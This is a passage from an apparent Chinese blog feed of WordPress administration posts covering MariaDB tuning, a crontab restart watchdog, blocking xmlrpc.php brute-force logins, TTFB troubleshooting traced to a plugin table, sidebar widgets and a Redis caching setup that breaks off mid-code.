<span class="token number">128.00000000</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>若要变更，只需在Mariadb配置文件修改·innodb_buffer_pool_size·参数大小即可。</p><p>默认情况下，Centos的Mariadb配置文件位置为：</p><blockquote><p>/etc/my.cnf</p></blockquote><p>但是官方并不推荐修改这个配置文件，因为当Mariadb升级时很可能会将其覆盖掉。不过这个配置文件会包含了一个配置目录<code>/etc/my.cnf.d</code>，其下的全部配置文件都会被包含进来。默认情况下，目录<code>/etc/my.cnf.d</code>内有三个配置文件：</p><blockquote><p>/etc/my.cnf.d/client.cnf<br>/etc/my.cnf.d/mysql-clients.cnf<br>/etc/my.cnf.d/server.cnf</p></blockquote><p>一般情况下，我们只需修改<code>/etc/my.cnf.d/server.cnf</code>配置文件即可。但是也可以在<code>/etc/my.cnf.d</code>目录下创建新的配置文件（它将被<code>/etc/my.cnf</code>自动包含）。</p><p>在本例中我们选择后者，即在<code>/etc/my.cnf.d</code>目录下创建新的配置文件。</p><p>打开<code>/usr/share/mysql</code>目录，可以发现这里有一些现成的mysql数据库样例配置文件，对应不同的使用场景：</p><blockquote><p>my-huge.cnf<br>my-innodb-heavy-4G.cnf<br>my-large.cnf<br>my-medium.cnf<br>my-small.cnf</p></blockquote><p>这里把<code>my-medium.cnf</code>拷贝过来：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cp</span> /usr/share/mysql/my-medium.cnf /etc/my.cnf.d/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过命令<code>vi /etc/my.cnf.d/my-medium.cnf</code>编辑配置文件，找到<code>innodb_buffer_pool_size</code>参数，去掉前面的#注释并修改成期望的大小即可（本文改成了32M）。</p><p>修改完成后，需重启Mariadb服务使其生效：</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl restart mariadb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="附2：利用crontab守护Mariadb"><a href="#附2：利用crontab守护Mariadb" class="headerlink" title="附2：利用crontab守护Mariadb"></a>附2：利用crontab守护Mariadb</h2><p>作为备用方案，可利用crontab实时监控Mariadb的进程状态，万一崩溃则自动重启Mariadb进程，这样在最坏的情况下也能保证站点的正常使用了。</p><p>crontab是Centos内置的定时计划服务，可以用以下命令启动和停止服务：</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl start crond.service   <span class="token comment" spellcheck="true"># 启动crontab服务</span>systemctl stop crond.service    <span class="token comment" spellcheck="true"># 停止crontab服务</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>使用<code>crontab -e</code>命令在crontab添加一行计划任务（拷贝下面的命令到末尾保存即可）：<font color="red">每分钟对Mariadb进程进行检查，若进程不存在则重新启动数据库服务</font>：</p><pre class="line-numbers language-bash"><code class="language-bash">*/1 * * * * <span class="token keyword">if</span> <span class="token punctuation">[</span> -z `ps -ef<span class="token operator">|</span><span class="token function">grep</span> mariadb<span class="token operator">|</span><span class="token function">grep</span> -v <span class="token function">grep</span><span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'{print <span class="token variable">$2</span>}'</span>` <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span> systemctl start mariadb<span class="token punctuation">;</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true"># 此计划任务解释：</span><span class="token comment" spellcheck="true"># */1 * * * *： 是cron表达式，这里表示每分钟执行一次。cron的语法可自行谷歌或百度</span><span class="token comment" spellcheck="true"># ps -ef：表示查看当前运行中的进程列表</span><span class="token comment" spellcheck="true"># grep mariadb：表示仅保留包含mariadb关键字的进程</span><span class="token comment" spellcheck="true"># grep -v grep：表示排除包含grep关键字的进程</span><span class="token comment" spellcheck="true"># awk '{print $2}'：表示提取进程号</span><span class="token comment" spellcheck="true"># -z：表示判断进程号是否为空</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重载或重启crontab使配置生效：</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl reload crond.service   <span class="token comment" spellcheck="true"># 重载crontab配置</span>systemctl restart crond.service   <span class="token comment" spellcheck="true"># 重启crontab服务</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>通过<code>crontab -l</code>命令可确认当前用户的计划任务列表。</p><p>需注意crontab默认不会开机自启，可编辑<code>vi /etc/rc.d/rc.local</code>文件，在末尾添加以下内容并保存即可：</p><blockquote><p>systemctl start crond.service</p></blockquote><h2 id="资源下载"><a href="#资源下载" class="headerlink" title="资源下载"></a>资源下载</h2><blockquote><p><a href="http://download.csdn.net/download/lyy289065406/10657460">本文全文下载</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mariadb </tag>
            
            <tag> WordPress </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>禁用 XMLRPC 避免 WP 站点被 DDOS 或暴力登录</title>
      <link href="/articles/website/jin-yong-xmlrpc-bi-mian-ddos/"/>
      <url>/articles/website/jin-yong-xmlrpc-bi-mian-ddos/</url>
      
        <content type="html"><![CDATA[<h2 id="诱因"><a href="#诱因" class="headerlink" title="诱因"></a>诱因</h2><p>自从使用 Wordpress 建站以来，就一直被机器人暴力爆破登录密码，其规模已经足以引起DDos攻击，导致服务器启动没多久，资源就被耗尽，打开极其缓慢。</p><p>即使安装 Limit Login Attempts 插件进行登录限制，依然会被机器人用 IP 池持续攻击，成效甚微：</p><p><img src="./01.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>从 Limit Login Attempts 插件的限制日志可以发现， 通过 XMLRPC 登录的次数远远大于通过 WP Login 登录的次数。</p><p>WP Login 就是通过 http://${site-url}/wp-login.php 直接登录， Limit Login Attempts 插件会加上校验码，使其不容易被爆破。</p><p>而 XMLRPC 的全称是 XML Remote Procedure Call，即 XML远程方法调用。它是 XHR （即 XMLHttpRequest）的一种实现，其交互消息都是基于 HTTP-POST 请求，请求的内容是 XML，服务端的返回结果同样也是 XML。</p><p>对于爬虫机器人而言，相对于 WP Login 方式，使用 XMLRPC 会更方便。因为前者更接近仿真方式登录，而后者则是纯脚本交互，而且可以绕过 Limit Login Attempts 等插件对登录页面的保护。</p><h2 id="处理"><a href="#处理" class="headerlink" title="处理"></a>处理</h2><p>知道根源，处理就很简单了。因为作为站长，一般是用不到 XMLRPC 去管理自己站点的，所以禁用它即可。</p><p>而禁用的方法有很多，最简单直接的方法，就是修改网站后台根目录的 <code>.htaccess</code> 文件，在末尾加上这段内容即可：</p><pre class="line-numbers language-xml"><code class="language-xml"># forbit xmlrpc.php request (crawler, ddos, ...)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Files</span> <span class="token attr-name">xmlrpc.php</span><span class="token punctuation">></span></span>order deny,allowdeny from all<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Files</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WordPress </tag>
            
            <tag> XMLRPC </tag>
            
            <tag> DDOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WP 站点的 TTFB 过长？记一次 TTFB 的优化过程</title>
      <link href="/articles/website/ji-yi-ci-ttfb-de-you-hua-guo-cheng/"/>
      <url>/articles/website/ji-yi-ci-ttfb-de-you-hua-guo-cheng/</url>
      
        <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>最近发现打开网站的响应时间变得很长，在浏览器通过F12打开控制台发现TTFB高达6秒。</p><p>而且经测试发现，不仅站点<strong>所有页面</strong>打开时的TTFB都需要6秒，连打开<strong>站点后台</strong>的TTFB也是固定6秒。</p><p><img src="./01.png"></p><h2 id="科普"><a href="#科普" class="headerlink" title="科普"></a>科普</h2><p>首先简单解析下，什么是TTFB？</p><p>TTFB (Time To First Byte)，是最初的网络请求被发起到从服务器接收到第一个字节这段时间，它包含了TCP连接时间，发送HTTP请求时间和获得响应消息第一个字节的时间。</p><h2 id="推测"><a href="#推测" class="headerlink" title="推测"></a>推测</h2><p>查询很多处理TTFB过慢文章，很多都是说减少DNS、使用CDN、提高服务器性能、甚至还与各个地区访问服务器的延迟状态等等方法。</p><p>但是经过初步测试，我判断并不是上面的原因引起的，这是因为：</p><ul><li>直接通过IP访问站点（即跳过DNS解析），TTFB依旧是6秒</li><li>把站点展示的内容（图文数据）完全克隆到另一台测试服务器（性能比正式服务器低），TTFB只有不到1秒</li><li>我的测试服务器和正式服务器是同一地区的，而测试服能达到秒级响应，说明不是地域问题</li></ul><p>但有个地方引起我的关注：</p><blockquote><p>正式服务器前后台的TTFB均是6秒，克隆内容后的测试服务器TTFB不到1秒</p></blockquote><p>因此我初步分析，很有可能在我打开站点的时候，<strong>站点做了某个行为</strong>，这个行为不论在我打开站点前台还是后台都会触发的，而这个行为跟我站点的展示内容无关。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>那么如何定位到这个行为是什么就是关键了。</p><p>考虑到TTFB的特点，这个行为要么发生在“TCP连接时间”，要么发生在“发送HTTP请求时间和获得响应消息第一个字节的时间”。但是发现站点的ping延迟并不高，因此嫌疑最重的就是后者。</p><p>但是就一般而言，站点收到HTTP请求并不会执行什么特殊操作，但是为了展示界面，一定会做的就是<strong>数据库访问</strong>，因此为了进一步定位是否为数据库导致的，<font color="red">我需要知道在访问网站的同时，站点执行了哪些SQL，每条SQL耗时多长</font>。</p><p>为此，查看<strong>数据库日志</strong>是最直接的。</p><p>一般情况下，WP使用的是 mysql/mariadb ，数据库日志默认是关闭的，因此需要先激活日志功能：</p><p>使用root用户登陆到数据库后，检查“数据库日志”是否开启：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SHOW</span> VARIABLES <span class="token operator">LIKE</span> <span class="token string">'general%'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"># 这份日志会保存到数据库的安装目录， Centos7默认的目录是 /var/lib/mysql/</span><span class="token operator">+</span><span class="token comment" spellcheck="true">------+-----------+  </span><span class="token operator">|</span> Variable_name <span class="token operator">|</span> <span class="token keyword">Value</span> <span class="token operator">|</span>  <span class="token operator">+</span><span class="token comment" spellcheck="true">------+-----------+  </span><span class="token operator">|</span> general_log <span class="token operator">|</span> <span class="token keyword">OFF</span> <span class="token operator">|</span>  <span class="token operator">|</span> general_log_file <span class="token operator">|</span> VM_211_224_centos<span class="token punctuation">.</span>log <span class="token operator">|</span>  <span class="token operator">+</span><span class="token comment" spellcheck="true">------+-----------+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>若为OFF，则开启之（这个选项的作用是把<strong>所有SQL操作</strong>打印到日志）：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SET</span> <span class="token keyword">GLOBAL</span> general_log<span class="token operator">=</span><span class="token string">'ON'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"># 当调试完毕后记得关闭之，否则太耗服务器资源了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>另外，还有一个相关的“慢查询日志”，检查是否开启：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SHOW</span> VARIABLES <span class="token operator">LIKE</span> <span class="token string">'%slow_query_log%'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"># 这份日志会保存到数据库的安装目录， Centos7默认的目录是 /var/lib/mysql/</span><span class="token operator">+</span><span class="token comment" spellcheck="true">---------+----+  </span><span class="token operator">|</span> Variable_name <span class="token operator">|</span> <span class="token keyword">Value</span> <span class="token operator">|</span>  <span class="token operator">+</span><span class="token comment" spellcheck="true">---------+----+  </span><span class="token operator">|</span> slow_query_log <span class="token operator">|</span> <span class="token keyword">OFF</span> <span class="token operator">|</span>  <span class="token operator">|</span> slow_query_log_file <span class="token operator">|</span> VM_211_224_centos<span class="token operator">-</span>slow<span class="token punctuation">.</span>log <span class="token operator">|</span>  <span class="token operator">+</span><span class="token comment" spellcheck="true">---------+----+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>若为OFF，则开启之（这个选项的作用是把<strong>执行时间超过一定数值的SQL</strong>打印到日志）：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SET</span> <span class="token keyword">GLOBAL</span> slow_query_log<span class="token operator">=</span><span class="token string">'ON'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"># 当调试完毕后记得关闭之，否则太耗服务器资源了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>无需重启数据库，直接刷新站点，发现 <code>VM_211_224_centos.log</code> 日志有内容，<code>VM_211_224_centos-slow.log</code>日志无内容（当然这是针对我的情况而言，mysql/mariadb默认超过10秒的SQL才是慢查询，后者没日志很可能就是因为并不存在这类SQL）。</p><p>虽然 <code>VM_211_224_centos.log</code> 日志有内容，但也仅仅是一股脑把所有SQL列印出来而已，并不能反映每条SQL的执行时长。</p><p>但是这里可以<font color="red">通过<code>tail -f</code>实时直播日志的打印</font>，以判断执行哪些SQL时会有停顿：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tail</span> -10f /var/lib/mysql/VM_211_224_centos.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="./02.png"></p><p>刷新网站后，发现日志只在这个SQL执行的时候出现卡顿：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> meta_value <span class="token keyword">FROM</span> wp_clean_up_optimizer_meta <span class="token keyword">WHERE</span> meta_key<span class="token operator">=</span><span class="token string">'other_settings'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我马上就发现，<code>wp_clean_up_optimizer_meta</code>这张表是属于之前安装的数据库优化插件【Clean Up Optimizer】的。检查这张表的数据，存储了约4000条<code>recent_login_data</code>，而<font color="red">这些数据记录的是近期发生过的登陆行为</font>，且含有不少长文本：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> wp_clean_up_optimizer_meta <span class="token keyword">where</span> meta_key <span class="token operator">=</span> <span class="token string">'recent_login_data'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>检查插件【Clean Up Optimizer】，确实<strong>有记录近期尝试登陆的用户信息</strong>的功能，且这个功能无法关闭。</p><p>而我相信任何一个作为WP的站长，都很清楚<strong>每天被大量机器人尝试登陆自己的站点</strong>已经不是什么鲜为人知的秘密。</p><p>为此带来的问题就是<code>wp_clean_up_optimizer_meta</code>表会因为这些<strong>无效登陆</strong>而<strong>日益膨胀</strong>。</p><p>虽然我不清楚这个插件有什么理由需要在每次打开站点页面时都去查询这张表，但是任由这张表去膨胀而不加约束、甚至不提供功能开关、还不加索引查询，都是很蠢的行为，而<strong>这正是导致这一系列问题的元凶</strong>。</p><p>于是，<font color="red">我停用了这个插件，现在打开任意页面，TTFB都降低到秒级了</font>。</p><p><img src="./03.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>需知道，每个站点TTFB变慢都可能有其特殊原因，并不能一概而论地去烦恼DNS、CDN等问题。</p><p>文本只是根据我的经验，提供一个排查思路，仅供参考。</p><p>最后，我给这个插件的作者发了一封邮件，这个事情就这么解决了。</p><p>但是讽刺的是，作为一个数据库优化的插件，却因为数据库的问题成为了网站访问延迟的元凶，看来我们也不能太过依赖一些便利的工具了。但我又转念一想，杀软和病毒，也不恰恰正是因为这种相互依赖关系才得以共存么？呵。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WordPress </tag>
            
            <tag> TTFB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WP 侧栏小挂件：WP Statistics 改版 &quot;文章/访问统计&quot;</title>
      <link href="/articles/website/wp-gua-jian-statistics/"/>
      <url>/articles/website/wp-gua-jian-statistics/</url>
      
        <content type="html"><![CDATA[<h2 id="挂件效果"><a href="#挂件效果" class="headerlink" title="挂件效果"></a>挂件效果</h2><p>由于WP Statistics自带的边栏统计小工具不好看，这是本站在WP Statistics插件基础上扩展的一个WP挂件。其实就是利用WP Statistics统计接口进行重写的一个统计小工具（可再自行修改CSS样式），其效果如下：</p><p><img src="./01.png"></p><h2 id="安装说明"><a href="#安装说明" class="headerlink" title="安装说明"></a>安装说明</h2><p>此工具需要预装两个插件才能使用：</p><ul><li>Enhanced Text Widget   （支持在前端写PHP的小工具）</li><li>WP-Statistics     （统计模块，用于借用其统计函数）</li></ul><h2 id="挂件下载"><a href="#挂件下载" class="headerlink" title="挂件下载"></a>挂件下载</h2><blockquote><p><a href="http://download.csdn.net/download/lyy289065406/10484948">WP-Statistics侧栏统计挂件 下载</a></p></blockquote><h2 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h2><p>1、下载后解压</p><p>2、把 statistics.css 拷贝到 Wordpress后台的主题目录下，被style.css引用（或者直接拷贝内容进去style.css也可）</p><p>3、在前端打开Wordpress的仪表盘， 外观 -&gt; 小工具 -&gt; Enhanced Text， 把 statistics.html 的内容拷贝进去即可</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WordPress </tag>
            
            <tag> 插件 </tag>
            
            <tag> Statistics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WP 侧栏小挂件：高仿 CSDN 的 &quot;关于我&quot;</title>
      <link href="/articles/website/wp-gua-jian-csdnaboutme/"/>
      <url>/articles/website/wp-gua-jian-csdnaboutme/</url>
      
        <content type="html"><![CDATA[<h2 id="挂件效果"><a href="#挂件效果" class="headerlink" title="挂件效果"></a>挂件效果</h2><p>此挂件是仿照CSDN的侧栏粘性挂件 “关于我” 做的，其效果如下：</p><p><img src="./01.png"></p><h2 id="挂件下载"><a href="#挂件下载" class="headerlink" title="挂件下载"></a>挂件下载</h2><blockquote><p><a href="http://download.csdn.net/download/lyy289065406/10564498">WordPress侧边栏 “关于我” 挂件 下载</a></p></blockquote><h2 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h2><p>1、下载后解压</p><p>2、把 about-me.css 拷贝到 Wordpress后台的主题目录下，被style.css引用（或者直接拷贝内容进去也可）</p><p>3、在前端打开Wordpress的仪表盘， 外观 -&gt; 小工具 -&gt; 自定义HTML， 把 about-me.html 的内容拷贝进去即可</p><p>4、about-me.html 内的图片地址修改为自己的图片地址即可</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WordPress </tag>
            
            <tag> 插件 </tag>
            
            <tag> CSDN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>站长工具</title>
      <link href="/articles/website/site-package/"/>
      <url>/articles/website/site-package/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://lyy289065406.github.io/site-package/">正在重定向到内容页面 ……</a></p></blockquote><p><a href="https://lyy289065406.github.io/site-package/">如果您的浏览器没有自动跳转， 请点击这里</a></p>    <!-- 自动跳转 -->    <meta http-equiv="refresh" content="0; url=https://lyy289065406.github.io/site-package/"><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 资源 </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>加速访问 WordPress：Redis 部署笔记</title>
      <link href="/articles/website/jia-su-fang-wen-wordpress/"/>
      <url>/articles/website/jia-su-fang-wen-wordpress/</url>
      
        <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>通过<strong>缓存加速 WordPress 站点访问</strong>的方法有很多，从软件层面来说，<strong>主要有两种方式</strong>：</p><ul><li><strong>生成静态页面缓存</strong>（如通过 WP Super Cache 插件实现）</li><li><strong>动态对象缓存</strong>（如通过 Redis Object Cache 插件实现，<strong>详见本文</strong>）</li></ul><p>对于一般的站点来说（例如WordPress博客，但需保证其大部分页面都没有随机化查询），如果不是刚需，使用WP Super Cache插件进行静态页面缓存加速是够用的，方便且暴力。</p><p>当然也可使用Redis Object Cache（基于Redis的动态对象缓存），但这更适用于那些经常需要动用数据库查询的站点（例如WordPress论坛）。</p><p>那么究竟<strong>什么时候用静态缓存，什么时候用动态缓存</strong>？可以参考下面两个例子：</p><p>① 假设一个日IP大于2万的WordPress站点，虽然这个站的流量很高，但是站点本身不需要开放用户注册的功能，那么站长最好的加速方案就是用各种类似WP Super Cache的插件生成静态页面。因为这类站点本身就不大需要动用数据库查询，所以自然也就不太需要Redis做对象缓存。</p><p>② 假设还是一个日IP大于2万的WordPress站点，但是这个站点必须要开放用户注册，并且用户注册的数量也相当之多，每天登录的用户也相当之多，那么这个时候一个生成静态页面的缓存插件可能就达不到理想的效果了。因为用户登录的这种行为，插件是无法静态化的，那么这种本身就需要经常动用数据库查询的操作，该如何提高效率呢？这个时候就需要用到Redis的对象缓存了。从本质上看，对象缓存就是缓存那些经常需要在数据库中查询的数据，当这种数据再次需要查询的时候，就可以通过Redis直接从内存中读取，而不需要再到MySQL中反复查询。这样就达到了一个加速、优化的效果。</p><p>下面则<font color="red"><strong>针对 WordPress + Redis 的部署方式进行详细说明</strong></font>。</p><h2 id="2-Redis-部署环境声明"><a href="#2-Redis-部署环境声明" class="headerlink" title="2. Redis 部署环境声明"></a>2. Redis 部署环境声明</h2><p>本文是基于Centos7系统中LAMP环境下的WordPress站点（详见<a href="../wordpress-bu-shu-bi-ji/">《LAMP环境 + WordPress 部署笔记》</a>），进行Redis缓存加速服务的部署。</p><h2 id="3-Redis-数据库服务端安装"><a href="#3-Redis-数据库服务端安装" class="headerlink" title="3. Redis 数据库服务端安装"></a>3. Redis 数据库服务端安装</h2><p>到官网下载最新版，本文下载的版本是 <font color="red">redis-4.0.10.tar.gz</font>：</p><ul><li>中文官网：<a href="http://www.redis.cn/">http://www.redis.cn/</a></li><li>英文官网（需翻墙）：<a href="https://redis.io/">https://redis.io/</a></li></ul><p>上传到WordPress所在的服务器，本文上传位置为（<strong>注意这个位置就是最终的安装目录</strong>）：</p><blockquote><p><font color="red">/usr/local/</font>redis-4.0.10.tar.gz</p></blockquote><p>解压安装包：</p><blockquote><p>tar -zxvf redis-4.0.10.tar.gz</p></blockquote><p>由于Redis需要编译安装，先安装gcc编译环境：</p><blockquote><p>yum install gcc</p></blockquote><p>进入Redis<strong>安装目录</strong>：</p><blockquote><p>cd <font color="red">/usr/local/redis-4.0.10/</font></p></blockquote><p>编译：</p><blockquote><p>make MALLOC=libc</p></blockquote><p>编译完成后，进入src目录：</p><blockquote><p>cd /usr/local/redis-4.0.10/src/</p></blockquote><p>把 src 目录下的文件安装到 /usr/local/bin ：</p><blockquote><p>make install</p></blockquote><p>至此<font color="red"><strong>Redis数据库服务端安装完成</strong></font>。</p><h2 id="4-Redis配置"><a href="#4-Redis配置" class="headerlink" title="4. Redis配置"></a>4. Redis配置</h2><p>默认情况下，Redis是通过这种方式启动的，非但无法在后台运行，而且也不符合使用习惯：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/local/redis-4.0.10/src/   <span class="token comment" spellcheck="true"># 切换到启动脚本目录</span>./redis-server <span class="token punctuation">..</span>/redis.conf      <span class="token comment" spellcheck="true"># 启动Redis</span>Ctrl + C                          <span class="token comment" spellcheck="true"># 停止Redis</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>另外Redis也不直接支持开机自启，为此<strong>要对其进行改造</strong>。</p><h3 id="4-1-设置Redis为后台进程启动模式"><a href="#4-1-设置Redis为后台进程启动模式" class="headerlink" title="4.1. 设置Redis为后台进程启动模式"></a>4.1. 设置Redis为后台进程启动模式</h3><p>通过vi修改redis.conf文件：</p><blockquote><p>vi /usr/local/redis-4.0.10/redis.conf</p></blockquote><p>修改为支持后台启动，找到<strong>关键字 daemonize no</strong>，修改为：</p><blockquote><p>daemonize <font color="red">yes</font></p></blockquote><p>这里 <em>顺便修改</em> 最大内存为512M（根据实际情况配置，<font color="blue">建议为当前空闲内存的50%左右</font>），找到<strong>关键字maxmemory</strong>，修改为（注意<strong>单位是byte</strong>）：</p><blockquote><p>maxmemory 536870912</p></blockquote><h3 id="4-2-设置Redis开机自启动"><a href="#4-2-设置Redis开机自启动" class="headerlink" title="4.2. 设置Redis开机自启动"></a>4.2. 设置Redis开机自启动</h3><p>在/etc目录下新建redis目录：</p><blockquote><p>mkdir /etc/redis</p></blockquote><p>拷贝redis.conf配置文件到/etc/redis目录下，并<font color="red">重命名为6379.conf</font>（取的是Redis默认端口名称，Redis启动脚本里的变量会读取这个名称，因此<strong>若redis的端口号改了，这个文件名也要修改</strong>）：</p><blockquote><p>cp /usr/local/redis-4.0.10/redis.conf /etc/redis/6379.conf</p></blockquote><p>拷贝Redis的启动脚本到/etc/init.d目录下，并<font color="red">重命名为redisd</font>：</p><blockquote><p>cp /usr/local/redis-4.0.10/utils/redis_init_script /etc/init.d/redisd</p></blockquote><p>通过vi修改redisd文件：</p><blockquote><p>vi /etc/init.d/redisd</p></blockquote><p>在<strong>首行 #!/bin/sh 下面添加两行</strong>（其含义是Redis服务必须在运行级2，3，4，5下被启动或关闭，启动的优先级是90，关闭的优先级是10）：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token comment" spellcheck="true"># chkconfig:   2345 90 10</span><span class="token comment" spellcheck="true"># description:  Redis is a persistent key-value database</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>切换到/etc/init.d目录：</p><blockquote><p>cd /etc/init.d</p></blockquote><p>设置为开机自启：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chkconfig</span> redisd on<span class="token comment" spellcheck="true"># 关闭开机自启</span><span class="token comment" spellcheck="true"># chkconfig redisd off</span><span class="token comment" spellcheck="true"># 显示所有运行级系统服务的运行状态信息</span><span class="token comment" spellcheck="true"># chkconfig --list</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在可以<font color="red">直接以服务的形式启动和停止Redis了</font>：</p><ul><li>启动：service redisd start</li><li>停止：service redisd stop</li></ul><h2 id="5-Redis-Object-Cache-插件安装"><a href="#5-Redis-Object-Cache-插件安装" class="headerlink" title="5. Redis Object Cache 插件安装"></a>5. Redis Object Cache 插件安装</h2><p>直接在WordPress插件中心搜索安装即可，<strong>不需要也无法改动Redis配置</strong>。只要Redis服务没有修改过端口和密码，就可以使用默认值。</p><p>理论上通过修改WordPress的设置文件wp-config.php，可以添加并修改Redis Object Cache的配置，但实测无效（即使重启过服务器也不生效）：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">'WP_REDIS_CLIENT'</span><span class="token 